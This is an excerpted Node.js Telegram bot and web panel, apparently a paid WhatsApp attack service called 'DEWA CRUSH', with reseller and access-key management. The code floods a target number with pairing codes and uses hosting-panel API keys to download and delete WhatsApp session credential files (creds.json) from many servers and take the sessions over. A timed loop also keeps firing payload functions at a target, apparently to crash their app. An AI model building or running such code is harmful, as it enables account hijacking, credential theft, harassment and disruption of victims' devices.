...
bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  if (!isOwner(userId)) return ctx.reply("🚫 Akses ditolak.");
...
bot.command("addpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  if (!isOwner(userId) && !isModerator(userId)) return ctx.reply("🚫 Akses ditolak.");
...
function makeBox(title, lines) {
  const contentLengths = [title.length, ...lines.map(l => l.length)];
  ...
  const padRight = (text, width) => text + " ".repeat(width - text.length);
...
const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  ...
  const delayMs = 2000;
  try {
    await ctx.reply(`🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`, { parse_mode: "HTML" });
    ...
    for (let i = 1; i <= total; i++) {
      try {
        ...
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;
        await ctx.telegram.sendMessage(chatId, ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`, { parse_mode: "HTML" });
      } catch (err) {
        await ctx.telegram.sendMessage(chatId, ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`, { parse_mode: "HTML" });
      }
...
bot.command("start", async (ctx) => {
  ...
  const keyboard = new InlineKeyboard().url("-#Channel", "https://t.me/dilxzabout");
  await ctx.replyWithPhoto({ url: "https://files.catbox.moe/sx6bsh.jpg" }, { caption: teks, parse_mode: "HTML", reply_markup: keyboard });
  await ctx.replyWithAudio({ url: "https://files.catbox.moe/96lq7e.mp3" }, { caption: "🎵 SERANA - FOUR REVENGE", parse_mode: "HTML" });
});
...
bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (!isOwner(userId) && !isAuthorized(userId)) return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
...
bot.command("addsender", async (ctx) => {
  ...
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg || !replyMsg.document) return ctx.reply("❌ Balas file session dengan perintah /add");
  const doc = replyMsg.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) return ctx.reply("❌ File bukan session (.json/.zip/.tar/.tgz)");
  ...
  try {
    ...
    if (!credsPath) return ctx.reply("❌ creds.json tidak ditemukan di file session.");
    ...
    const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    if (!list.includes(botNumber)) fs.writeFileSync(file_session, JSON.stringify([...list, botNumber]));
...
bot.command("ckey", async (ctx) => {
  ...
  if (!isOwner(userId) && !isAuthorized(userId)) return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  if (!args || !args.includes(",")) return ctx.reply("✗ Falha\n\nExample :\n• /ckey rann,30d\n• /ckey rann,30d,puki", { parse_mode: "HTML" });
  ...
  saveUsers(users);
  const expiredStr = new Date(expired).toLocaleString("id-ID", { year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", timeZone: "Asia/Jakarta" });
  try {
    await ctx.reply("✓ Key berhasil dibuat! Informasi key telah dikirim ke pesan private Anda.");
    const keyboard = { reply_markup: { inline_keyboard: [[{ text: "-#Channel", url: "https://t.me/dilxzabout" }]] } };
    await ctx.telegram.sendMessage(ctx.from.id, `✓ <b>Key berhasil dibuat:</b>\n\n<b>Username:</b> <code>${username}</code>\n<b>Password:</b> <code>${key}</code>\n<b>Expired:</b> <i>${expiredStr}</i> WIB\n\n⬇️ <i>Klik button di bawah untuk informasi lebih lanjut:</i>`, { parse_mode: "HTML", ...keyboard });
  } catch (error) {
    await ctx.reply("✓ Key berhasil dibuat! Namun saya tidak bisa mengirim pesan private kepada Anda.\n\nSilakan mulai chat dengan saya terlebih dahulu, lalu gunakan command ini lagi.", { parse_mode: "HTML" });
  }
});
...
bot.command("listkey", async (ctx) => {
  ...
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", { year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", timeZone: "Asia/Jakarta" });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });
...
bot.command("adp", async (ctx) => {
  ...
  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, { headers: { Accept: "application/json", Authorization: `Bearer ${plta}` } });
    ...
    for (const srv of servers) {
      ...
      const commonPaths = ["/home/container/session/creds.json", "/home/container/sessions/creds.json", "/session/creds.json", "/sessions/creds.json"];
      let credsBuffer = null;
      let usedPath = null;
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, { params: { file: p }, headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } });
      ...
      totalFound++;
      try {
        await axios.post(`${domainBase}/api/client/servers/${identifier}/files/delete`, { root: "/", files: [usedPath.replace(/^\/+/, "")] }, { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } });
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(`[WARN] Gagal hapus creds.json di server ${identifier}: ${err.response?.status || err.message}`);
      }
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate = json.id || json.phone || json.number || (json.me && (json.me.id || json.me.jid || json.me.user)) || json.clientID || (json.registration && json.registration.phone) || null;
        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) BotNumber = "62" + BotNumber;
        } else {
      ...
      for (const oid of ownerIds) {
        try {
          ...
          await ctx.telegram.sendMessage(oid, `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`, { parse_mode: "Markdown" });
        } catch (e) {
      ...
      try {
        ...
        const emsg = err?.response?.status === 404 ? "404 Not Found" : err?.response?.status === 403 ? "403 Forbidden" : err?.response?.status === 440 ? "440 login Timeout" : err?.message || "Unknown error";
        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);
        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(oid, `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`, { parse_mode: "Markdown" });
          } catch {}
        }
      }
      await sleep(REQUEST_DELAY_MS * 2);
    ...
    else await ctx.reply(`✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`);
  } catch (err) {
...
app.get("/execution", (req, res) => {
  ...
  // Kalau gak ada cookie, balik ke login
  if (!username) {
    return res.redirect("/login");
  }

  // Langsung tampilkan Verse.html
  const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
  fs.readFile(versePath, "utf8", (err, html) => {
    if (err) {
      return res.status(500).send("❌ Gagal baca Verse.html: " + err.message);
    }
    res.send(html);
  });
});
...
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ DEWA CRUSH API running on port ${PORT}`);
...
async function GetSuZoXAndros(durationHours, X) {
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 35) {
        await Promise.all([Atut(X), Invisibledk(X), await sleep(500)]);
